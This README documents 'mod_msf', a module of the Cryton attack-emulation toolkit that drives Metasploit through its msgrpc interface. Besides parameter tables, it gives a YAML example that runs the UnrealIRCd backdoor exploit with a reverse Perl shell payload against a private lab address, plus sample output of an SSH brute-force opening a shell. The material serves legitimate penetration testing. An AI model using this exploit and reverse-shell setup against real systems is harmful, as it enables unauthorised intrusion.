# mod_msf

Module for orchestrating Metasploit Framework.

## Requirements

System requirements (those not listed in requirements.txt for python).

For this module to function
properly, [Metasploit-framework](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers) needs to be
installed.

After a successful installation of Metasploit-framework, you need to load msgrpc plugin. Easiest way to do this to open
your terminal and run `msfrpcd` with `-P toor` to use password and `-S` to turn off SSL (depending on configuration in
Worker config file).

**Optional:**

Another option is to run Metasploit using `msfconsole` and load msgrpc plugin using this command:

````bash
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass='toor' SSL=true
````

This is just default, feel free to change the parameters to suit your needs, but keep in mind that they must match your
worker config file.

After successfully loading the msgrpc plugin, you are all set and ready to use this module.

## Input parameters

Description of input parameters for module.

| Parameter name              | Parameter description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
|-----------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `module_type`               | MSF module type (valid values: `exploit`, `auxiliary`, `post`, `payload`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `module_name`               | Name of metasploit module (without the `module_type` prefix)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `module_options` (optional) | Custom dictionary with options for the given module (eg. `RHOSTS`, `RPORT`, ...)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `payload_name` (optional) | Name of the payload to use in combination with the given module (without the `payload/` prefix)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `payload_options` (optional) | Custom dictionary with options for the given payload (eg. `LHOSTS`, `LPORT`, ...)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `run_as_job` (optional) | Boolean value (`True` or `False`) wether the module should be executed as background job. If `True` the module is executed without waiting for the job to finish. If the `create_named_session` option is set in combination with this option being `True`, then this module waits until the job is finished and looks for a new session within the session-list. Be aware, that then the console output of the module's execution may not be fully captured. Default value: `False`<br/>If this option is set to `False`, then the module waits until the job is completed and the output of the module is fully captured. |
| `session_id` (optional) | Integer value which defines the `SESSION` parameter within the `module_options`. Use only in combination with metasploit modules, which support the `SESSION` parameter. Default value: `None`                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `create_named_session` (optional) | Name of session which should be created within the modules execution. If this option is set, then the module waits up to `session_timeout_in_sec` seconds to look for a new session. Default value: `None`                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `exploit_timeout_in_sec` (optional) | Integer value with number of seconds to wait before the module execution will be terminated. Default value: `60`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `exploit_retries` (optional) | Integer value which defines the retries of the module in case of `exploit_timeout_in_sec` is reached. Default value: `1` (no retry, execute only once)                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `session_timeout_in_sec` (optional) | Integer value which defines the number of seconds to wait until a new session should be opened after the modules execution. Should be used in combination of `create_named_session`. Default value: `60`                                                                                                                                                                                                                                                                                                                                                                                                                    |

This module can create sessions using
our [Cryton session management](https://cryton.gitlab-pages.ics.muni.cz/cryton-project/1.0/scenario/#session-management)
feature.

### Example yaml(s)

```yaml
attack_module: mod_msf_module
create_named_session: session_to_target_1
attack_module_args:
  module_type: "exploit"
  module_name: "unix/irc/unreal_ircd_3281_backdoor"
  module_options:
    RHOSTS: "172.28.128.99"
    RPORT: "6697"
  payload_name: "cmd/unix/reverse_perl"
  payload_options:
    LHOST: "172.28.128.3"
    LPORT: "6677"
  run_as_job: true
  exploit_timeout_in_sec: 15
  exploit_retries: 7
  session_timeout_in_sec: 20
```

## Output

Description of module output.

| Parameter name | Parameter description                                        |
| -------------- | ------------------------------------------------------------ |
| `return_code`  | 0 - success<br />-1 - fail                   |
| `std_out`      | Raw output of msf exploit                               |
| `mod_err`      | Error while running msf exploit                        |
| `mod_out`      | Same as std_out |

### Example

```
{
    'return_code': 0, 
    'std_out': "RHOSTS => 127.0.0.1\nUSERNAME => vagrant\nPASSWORD => vagrant\n[*] Auxiliary module running as background job 4.\n[*] 127.0.0.1:22 - Starting bruteforce\n[+] 127.0.0.1:22 - Success: 'vagrant:vagrant' 'uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),122(kali-trusted),133(scanner),142(kaboxer),143(docker) Linux kali 5.10.0-kali7-amd64 #1 SMP Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux '\n[*] Command shell session 2 opened (127.0.0.1:35199 -> 127.0.0.1:22) at 2021-05-22 22:57:36 +0200\n[*] Scanned 1 of 1 hosts (100% complete)\n",
    'mod_err': None,
    'mod_out': "RHOSTS => 127.0.0.1\nUSERNAME => vagrant\nPASSWORD => vagrant\n[*] Auxiliary module running as background job 4.\n[*] 127.0.0.1:22 - Starting bruteforce\n[+] 127.0.0.1:22 - Success: 'vagrant:vagrant' 'uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),122(kali-trusted),133(scanner),142(kaboxer),143(docker) Linux kali 5.10.0-kali7-amd64 #1 SMP Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux '\n[*] Command shell session 2 opened (127.0.0.1:35199 -> 127.0.0.1:22) at 2021-05-22 22:57:36 +0200\n[*] Scanned 1 of 1 hosts (100% complete)\n"
}

```